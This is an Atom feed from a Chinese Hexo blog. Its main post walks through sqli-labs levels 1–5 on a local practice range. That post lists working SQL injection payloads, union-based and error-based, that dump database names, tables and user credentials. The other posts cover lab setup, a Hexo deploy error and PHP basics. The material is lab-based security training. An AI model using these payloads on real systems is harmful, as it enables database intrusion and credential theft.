<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>大白</title>
  
  
  <link href="https://dabai5269.top/atom.xml" rel="self"/>
  
  <link href="https://dabai5269.top/"/>
  <updated>2023-03-23T11:58:17.645Z</updated>
  <id>https://dabai5269.top/</id>
  
  <author>
    <name>大白</name>
    
  </author>
  
  <generator uri="https://hexo.io/">Hexo</generator>
  
  <entry>
    <title>sqli-labs</title>
    <link href="https://dabai5269.top/post/b3432909.html"/>
    <id>https://dabai5269.top/post/b3432909.html</id>
    <published>2023-03-22T12:16:16.000Z</published>
    <updated>2023-03-23T11:58:17.645Z</updated>
    
    <content type="html"><![CDATA[<h2 id="判断注入类型"><a href="#判断注入类型" class="headerlink" title="判断注入类型"></a>判断注入类型</h2><h3 id="数字型"><a href="#数字型" class="headerlink" title="数字型"></a>数字型</h3><ol><li><strong>Url 地址中输入 <a href="http://xxx/xx.php?id=">http://xxx/xx.php?id=</a> x and 1&#x3D;1 页面依旧运行正常，继续进行下一步。</strong></li><li><strong>Url 地址中继续输入 <a href="http://xxx/xx.php?id=">http://xxx/xx.php?id=</a> x and 1&#x3D;2 页面运行错误，则说明此 Sql 注入为数字型注入。</strong></li></ol><h3 id="字符型"><a href="#字符型" class="headerlink" title="字符型"></a>字符型</h3><ol><li><p><strong>Url 地址中输入 <a href="http://xxx/xx.php?id=">http://xxx/xx.php?id=</a> x’ and ‘1’&#x3D;’1 页面运行正常，继续进行下一步。</strong></p><p>2.<strong>Url 地址中继续输入 <a href="http://xxx/xx.php?id=">http://xxx/xx.php?id=</a> x’ and ‘1’&#x3D;’2 页面运行错误，则说明此 Sql 注入为字符型注入。</strong></p></li></ol><h2 id="猜解数据库中字段数"><a href="#猜解数据库中字段数" class="headerlink" title="猜解数据库中字段数"></a>猜解数据库中字段数</h2><p>​    <strong>使用 order by x 进行猜解的时候可以使用二分法进行猜解，先使用大一点的数字数字进行测试，如果报错就换数字的一半进行测试，当范围缩小时在依次测试。</strong><br> <strong>注意：</strong> <em>(–+为注释，将–+之后的语句都注释)</em></p><h2 id="Less-1"><a href="#Less-1" class="headerlink" title="Less-1"></a>Less-1</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"># 这是字符型注入</span><br><span class="line">http://127.0.0.1/sqli-labs-master/Less-1/?id=1</span><br><span class="line"># 使用order by进行联合注入，显示字段</span><br><span class="line">http://127.0.0.1/sqli-labs-master/Less-1/?id=1&#x27; order by 3 --+</span><br><span class="line"># 在我们回显字段，将id改成错误的值（-1，0，-2等）</span><br><span class="line">http://127.0.0.1/sqli-labs-master/Less-1/?id=-1&#x27; union select 1,2,3 --+</span><br><span class="line"># 通过回显数值我们将该数值显示成数据库的名称 利用database()函数</span><br><span class="line">http://127.0.0.1/sqli-labs-master/Less-1/?id=-1&#x27; union select 1,database(),3 --+</span><br><span class="line"># 获得数据库名称后，再获取数据库中的表，获取全部的表需要一个group_concat()函数</span><br><span class="line">http://127.0.0.1/sqli-labs-master/Less-1/?id=-1&#x27; union select 1,database(),group_concat(table_name) from information_schema.tables where table_schema=&#x27;security&#x27; --+</span><br><span class="line"># 在获得数据表以后,我们来获取users表中的列名</span><br><span class="line">http://127.0.0.1/sqli-labs-master/Less-1/?id=-1&#x27; union select 1,database(),group_concat(column_name) from information_schema.columns where table_name=&#x27;users&#x27; --+</span><br><span class="line"># 获取到列名以后，我们再获取该列数据</span><br><span class="line">http://127.0.0.1/sqli-labs-master/Less-1/?id=-1&#x27; union select 1,database(),group_concat(username ,&#x27;:&#x27;, password) from users --+</span><br></pre></td></tr></table></figure><p>sql注入完成，下图<img src="https://dabai-1316520326.cos.ap-nanjing.myqcloud.com/img/7caf5a7f70244185b669b92d2026b58f.png" alt="7caf5a7f70244185b669b92d2026b58f"></p><h2 id="Less-2"><a href="#Less-2" class="headerlink" title="Less-2"></a>Less-2</h2><p>第二关为数字型注入和第一个一样，删除 id&#x3D;1后面的引号即可</p><h2 id="Less-3"><a href="#Less-3" class="headerlink" title="Less-3"></a>Less-3</h2><p>第三关的注入类型是基于 ‘) 的注入，只需要把注入点改为 ‘) 就可以了。</p><h2 id="Less-4"><a href="#Less-4" class="headerlink" title="Less-4"></a>Less-4</h2><p> 输入单引号进行测试：</p><p><img src="https://dabai-1316520326.cos.ap-nanjing.myqcloud.com/img/74e406b234e645c29efa332800e9da0e.png" alt="74e406b234e645c29efa332800e9da0e"></p><p>我们发现并没有报错，那么就有可能是数据库后台把单引号过滤了，既然单引号类型被过滤了，那么我们就去测试双引号，我们输入注入语句：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?id=1&quot;</span><br></pre></td></tr></table></figure><p><img src="https://dabai-1316520326.cos.ap-nanjing.myqcloud.com/img/a442969c22e546bcb4de182b451511fb.png" alt="a442969c22e546bcb4de182b451511fb"></p><p>页面报错并且爆出了单括号，根据第三关的经验我们首先测试是不是基于 “) 的注入类型 ，输入注入语句：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?id=1&quot;) and 1=1 --+</span><br><span class="line">?id=1&quot;) 1=2 --+</span><br></pre></td></tr></table></figure><p>第一个显示正常，第二个不正常但无报错说明有可能是基于 “) 的注入类型，接下来我们输入ORDER BY 语句进行测试：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?id=1&quot;) order by 3 --+</span><br></pre></td></tr></table></figure><p>页面显示正常。。<img src="https://dabai-1316520326.cos.ap-nanjing.myqcloud.com/img/bc6ba356af0f40cb9c807af291f8c9f8.png" alt="bc6ba356af0f40cb9c807af291f8c9f8"></p><h2 id="Less-5"><a href="#Less-5" class="headerlink" title="Less-5"></a>Less-5</h2><p>判断为字符注入，通过 ‘ 闭合查询无返回的数据，无论是有数据返回还是无数据返回页面都不会显示相关的数据。</p><p>所以这关的重点是盲注。</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://127.0.0.1/sqli-labs-master/less-5/?id=-1&#x27;  %23</span><br></pre></td></tr></table></figure><p><strong>开始注入</strong></p><p>​    <strong>1.双查询注入</strong>(需要多点几下才能出效果)</p><p> <strong>爆库名</strong></p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://127.0.0.1/sqli-labs-master/less-5/?id=1&#x27; union select 1, count(*), concat((select database()), floor(rand()*2)) a from information_schema.tables group by a  %23</span><br></pre></td></tr></table></figure><p><img src="https://dabai-1316520326.cos.ap-nanjing.myqcloud.com/img/9a3f71c5fcf540ffbe4b7e94d7998f81.png" alt="9a3f71c5fcf540ffbe4b7e94d7998f81"></p><p> <strong>爆表名</strong></p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://127.0.0.1/sqli-labs-master/less-5/?id=1&#x27; union select 1, count(*), concat((select group_concat(table_name) from information_schema.tables where table_schema = &#x27;security&#x27;), floor(rand()*2)) a from information_schema.tables group by a  %23</span><br></pre></td></tr></table></figure><p><img src="https://dabai-1316520326.cos.ap-nanjing.myqcloud.com/img/04fa7aee6738498a91df6a16e267265d.png" alt="04fa7aee6738498a91df6a16e267265d"></p><p><strong>爆列名</strong></p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://127.0.0.1/sqli-labs-master/less-5/?id=1&#x27; union select 1, count(*), concat((select group_concat(column_name) from information_schema.columns where table_schema = &#x27;security&#x27; and table_name = &#x27;users&#x27;), floor(rand()*2)) a from information_schema.tables group by a  %23</span><br></pre></td></tr></table></figure><p><img src="https://dabai-1316520326.cos.ap-nanjing.myqcloud.com/img/75ca52a0302c4955a19a3d97bbd6b99c.png" alt="75ca52a0302c4955a19a3d97bbd6b99c"></p><p><strong>爆字段内容（获取用户表的账号和密码）</strong></p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://127.0.0.1/sqli-labs-master/less-5/?id=1&#x27; union select 1, count(*), concat((select concat(username,&#x27;~&#x27;,password) from users  limit 0,1), floor(rand()*2)) a from information_schema.tables group by a  %23</span><br></pre></td></tr></table></figure><p><img src="https://dabai-1316520326.cos.ap-nanjing.myqcloud.com/img/5e3f5be531ef42389799d5c690d02801.png" alt="5e3f5be531ef42389799d5c690d02801"></p><p>其他账号密码更改limit后面的0为1，2，3，4就可以出来了。</p>]]></content>
    
    
    <summary type="html">sqli-labs前五关</summary>
    
    
    
    
  </entry>
  
  <entry>
    <title>解决博客Spawn failed</title>
    <link href="https://dabai5269.top/post/83dcefb7.html"/>
    <id>https://dabai5269.top/post/83dcefb7.html</id>
    <published>2023-02-21T14:03:52.000Z</published>
    <updated>2023-02-22T11:49:05.099Z</updated>
    
    <content type="html"><![CDATA[<p>错误如下</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Error: Spawn failed</span><br><span class="line">      at ChildProcess.&lt;anonymous&gt; (/usr/local/src/hexo/hanyubolg/node_modules/hexo-util/lib/spawn.js:51:21)</span><br><span class="line">      at ChildProcess.emit (events.js:376:20)</span><br><span class="line">      at Process.ChildProcess._handle.onexit (internal/child_process.js:277:12) &#123;</span><br><span class="line">    code: 128</span><br><span class="line">  &#125;</span><br><span class="line">&#125; Something&#x27;s wrong. Maybe you can find the solution here: %s https://hexo.io/docs/troubleshooting.html</span><br></pre></td></tr></table></figure><p>解决方法</p><p>有可能是你的git repo配置地址不正确,可以将http方式变更为ssh方式，如图</p><p><img src="https://dabai-1316520326.cos.ap-nanjing.myqcloud.com/img/image-20230222194656561.png" alt="image-20230222194656561"></p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">deploy:</span><br><span class="line">  type: &#x27;git&#x27; # 这是固定的</span><br><span class="line">  repository:  #这里是你的仓库的地址，根据你自己实际的地址，进行添加</span><br><span class="line">  branch: main</span><br></pre></td></tr></table></figure><p>如果更改过一次，再更改一次即可。</p>]]></content>
    
    
    <summary type="html">博客部署Spawn failed</summary>
    
    
    
    
    <category term="Spawn failed" scheme="https://dabai5269.top/tags/Spawn-failed/"/>
    
  </entry>
  
  <entry>
    <title>搭建靶场</title>
    <link href="https://dabai5269.top/post/5f593b8b.html"/>
    <id>https://dabai5269.top/post/5f593b8b.html</id>
    <published>2023-02-11T06:16:25.000Z</published>
    <updated>2023-02-13T04:35:44.991Z</updated>
    
    <content type="html"><![CDATA[<h1 id="sql-labs靶场环境搭建"><a href="#sql-labs靶场环境搭建" class="headerlink" title="sql-labs靶场环境搭建"></a>sql-labs靶场环境搭建</h1><h2 id="SQLI-LAB下载地址"><a href="#SQLI-LAB下载地址" class="headerlink" title="SQLI-LAB下载地址"></a>SQLI-LAB下载地址</h2><p><a href="https://github.com/Audi-1/sqli-labs">https://github.com/Audi-1/sqli-labs</a></p><h2 id="WEB环境搭建"><a href="#WEB环境搭建" class="headerlink" title="WEB环境搭建"></a>WEB环境搭建</h2><p>在安装靶场之前，我们还需要搭建web运行环境（phpstudy）：<a href="https://www.xp.cn/download.html">https://www.xp.cn/download.html</a></p><h2 id="Sql-labs靶场环境搭建"><a href="#Sql-labs靶场环境搭建" class="headerlink" title="Sql-labs靶场环境搭建"></a>Sql-labs靶场环境搭建</h2><p>打开根目录</p><p><img src="https://dabai-1316520326.cos.ap-nanjing.myqcloud.com/img/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202023-02-11%20142815.png" alt="屏幕截图 2023-02-11 142815"></p><p>解压到WWW目录</p><p><img src="https://dabai-1316520326.cos.ap-nanjing.myqcloud.com/img/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202023-02-11%20142946.png" alt="屏幕截图 2023-02-11 142946"></p><p>在sqli-labs-master找到sqli-connections然后打开db-creds.inc，将$dbpass&#x3D;‘’改为$dbpass&#x3D;‘root’保存<img src="https://dabai-1316520326.cos.ap-nanjing.myqcloud.com/img/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202023-02-11%20143139.png" alt="屏幕截图 2023-02-11 143139"></p><p> 完成后打开phpstudy，启动Apache和Mysql</p><p><img src="https://dabai-1316520326.cos.ap-nanjing.myqcloud.com/img/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202023-02-11%20143514.png" alt="屏幕截图 2023-02-11 143514"></p><p>访问：<a href="http://127.0.0.1/sqli-labs-master/%E6%89%93%E5%BC%80%E9%A6%96%E9%A1%B5">http://127.0.0.1/sqli-labs-master/打开首页</a></p><p><img src="https://dabai-1316520326.cos.ap-nanjing.myqcloud.com/img/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202023-02-11%20143625.png" alt="屏幕截图 2023-02-11 143625"></p><p>点击Setup&#x2F;reset Database for labs使其自动创建数据库，如图</p><p><img src="https://dabai-1316520326.cos.ap-nanjing.myqcloud.com/img/b91c8481328444a7bc8f0423b1e65c3a.png" alt="b91c8481328444a7bc8f0423b1e65c3a"></p><h1 id="Upload-labs靶场的搭建"><a href="#Upload-labs靶场的搭建" class="headerlink" title="Upload-labs靶场的搭建"></a>Upload-labs靶场的搭建</h1><p>下载源码：<a href="https://github.com/Tj1ngwe1/upload-labs">https://github.com/Tj1ngwe1/upload-labs</a></p><p>解压到WWW目录</p><p>访问：<a href="http://127.0.0.1/upload-labs-master/">http://127.0.0.1/upload-labs-master/</a></p><p><img src="https://dabai-1316520326.cos.ap-nanjing.myqcloud.com/img/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202023-02-11%20144714.png" alt="屏幕截图 2023-02-11 144714"></p>]]></content>
    
    
    <summary type="html">sql-labs、upload-labs</summary>
    
    
    
    
    <category term="靶场" scheme="https://dabai5269.top/tags/%E9%9D%B6%E5%9C%BA/"/>
    
  </entry>
  
  <entry>
    <title>PHP</title>
    <link href="https://dabai5269.top/post/c036635b.html"/>
    <id>https://dabai5269.top/post/c036635b.html</id>
    <published>2023-02-05T07:13:36.000Z</published>
    <updated>2023-02-13T04:37:43.542Z</updated>
    
    <content type="html"><![CDATA[<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">&lt;!DOCTYPE html&gt;</span><br><span class="line">&lt;html&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line"></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;我的第一段 PHP 脚本！&quot;</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html</span><br></pre></td></tr></table></figure><p>PHP 脚本以 <em><?php* 开头，以 *?></em> 结尾：</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">// 此处是 PHP 代码</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><h2 id="Local-和-Global-作用域"><a href="#Local-和-Global-作用域" class="headerlink" title="Local 和 Global 作用域"></a>Local 和 Global 作用域</h2><p>函数<em>之外</em>声明的变量拥有 Global 作用域，只能在函数以外进行访问。</p><p>函数<em>内部</em>声明的变量拥有 LOCAL 作用域，只能在函数内部进行访问。</p><p>下面的例子测试了带有局部和全局作用域的变量：</p><p><img src="https://dabai-1316520326.cos.ap-nanjing.myqcloud.com/img/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202023-02-05%20152809.png" alt="屏幕截图 2023-02-05 152809"></p>]]></content>
    
    
    <summary type="html">PHP基础</summary>
    
    
    
    
    <category term="PHP" scheme="https://dabai5269.top/tags/PHP/"/>
    
  </entry>
  
</feed>
